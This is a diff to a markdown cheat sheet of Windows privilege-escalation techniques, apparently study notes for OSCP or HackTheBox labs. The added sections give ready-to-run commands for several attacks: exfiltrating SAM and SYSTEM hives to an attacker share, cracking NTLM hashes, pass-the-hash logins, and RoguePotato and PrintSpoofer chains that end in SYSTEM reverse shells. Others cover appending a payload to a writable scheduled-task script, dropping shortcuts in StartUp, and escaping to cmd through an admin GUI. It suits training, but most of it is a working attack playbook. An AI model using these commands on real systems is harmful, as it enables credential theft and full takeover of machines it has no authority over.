@@ -21,6 +21,8 @@
 18. [DLL Hijacking](#DLL_Hijacking)
 19. [Binary path or bin path](#Binary_path)
 20. [Unquoted Service Path](#Unquoted_Service_Path)
+21. [Sheduled Task](#Sheduled_Task)
+22. [Insecure GUI](#Insecure_GUI)
 ## 1. System Enumeration <a name="System_Enumeration"></a>
 - `systeminfo` for getting details of the system.
 	- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` to get filter information just like `grep` in linux.
@@ -48,11 +50,23 @@
 - `netstat -ano` to see what port is out there.
 
 ## 4. Password Hunting <a name="Password_Hunting"></a>
+### 4.1 Password in plain text
 - `findstr /si password *.txt *.ini *.config`
 	- Maybe user have put the passwords in clear text or in registry. The above will command will parse for "password" in txt,.ini,.config files in the directory.
 	- We can even search for WiFi Passwords because user can reuse the same password.
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+### 4.2 Security Account Manager (SAM)
+1. `copy C:\Windows\Repair\SAM \\10.10.10.10\kali\`  
+`copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`
+2. `git clone https://github.com/Tib3rius/creddump7` 
+`pip3 install pycrypto`  
+`python3 creddump7/pwdump.py SYSTEM SAM`
+3. `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
+
+### 4.3 Passing the hash
+If we find the NTLM hash we can try `pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe`.
 
 ## 5. AV and Firewall Enumeration<a name="AV_and_Firewall_Enumeration"></a>
 - `sc query windefend` - `sc` for service control. This command will show information of windows defender.
@@ -97,7 +111,7 @@ Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
 - Enumerate and find services. Look for any vulnerabilities found with exploitdb or anything.
 
 ***
-## 10. Password and Port Forwarding (chatterbox HTB) <a name="Password_and_Port_Forwarding></a>
+## 10. Password and Port Forwarding (chatterbox HTB) <a name="Password_and_Port_Forwarding"></a>
 https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
 1. Run nmap and found achat vulberability
 2. Found exploit in exploitdb
@@ -187,6 +201,17 @@ Juicy Potato: https://github.com/ohpe/juicy-potato
 
 Alternative Data Stream: https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
 
+### 12.4 Rogue Potato
+1. Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows: `sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999`
+2. Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account: `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
+3. Start another listener on Kali.
+4. Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly): `C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`
+
+### 12.5 PrintSpoofer
+1. Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:   `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
+2. Start another listener on Kali.
+3. Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly): `C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`
+
 ## 13. getsystem <a name="getsystem"></a>
 In metasploit meterpreter run `getsystem` it will try to escalate privileges.
 
@@ -270,6 +295,9 @@ Another method is...
 8. `sc start refsvc`
 9. `net localgroup administrators` to confirm.
 
+### 15.4 Password in Registry
+`reg query HKLM /f password /t REG_SZ /s`  if we find any password we can login using `winexe -U 'admin%password' //MACHINE_IP cmd.exe`
+
 ## 16. Executable File running as a Service <a name="Executable_File_running_as_a_Service"></a>
 1.  `powershell -ep bypass`
 2. `. .\PowerUp.ps1`
@@ -285,6 +313,13 @@ Another method is...
 1. `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` So if we get "BUILTIN\Users:(F)" That means we have full access.
 2. Create a payload and drop the payload in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" and start a listner in Kali.
 3. When administrator login we have  a shell.
+
+OR
+
+1. Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory: `C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
+2. Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory: `cscript C:\PrivEsc\CreateShortcut.vbs`
+3. Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted: `rdesktop -u admin MACHINE_IP`
+4. A shell running as admin should connect back to your listener.
 
 
 ## 18. DLL Hijacking
@@ -327,3 +362,19 @@ It will try to run the test.exe starting from C:\ till it find test.exe.
 6.  Start a listner in Kali.
 7.  Put in the path of the unqouted service.
 8.  `sc start [servicename]`
+
+
+## 21. Sheduled Task <a name="Sheduled_Task"></a>
+
+1. `schtasks` for viewing the sheduled task.
+2. Suppose `C:\DevTools\CleanUp.ps1` is a sheduled task.
+3. `type C:\DevTools\CleanUp.ps1` to see the content.
+4. `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1` to check permission.
+5. If its writable we can just `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1` or we insert any malicious code and wait for the sheduled task to execute our malicious code.
+
+## 22. Insecure GUI <a name="Insecure_GUI"></a>
+Suppose there is a GUI application that is running with admin privileages.
+1. Then we can run that GUI app. Supporse "AdminPaint". Run the application.
+2. `tasklist /V | findstr mspaint.exe` to see whether its running with adminprivileages or not.
+3. In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe 
+4. Press Enter to spawn a command prompt running with admin privileges.
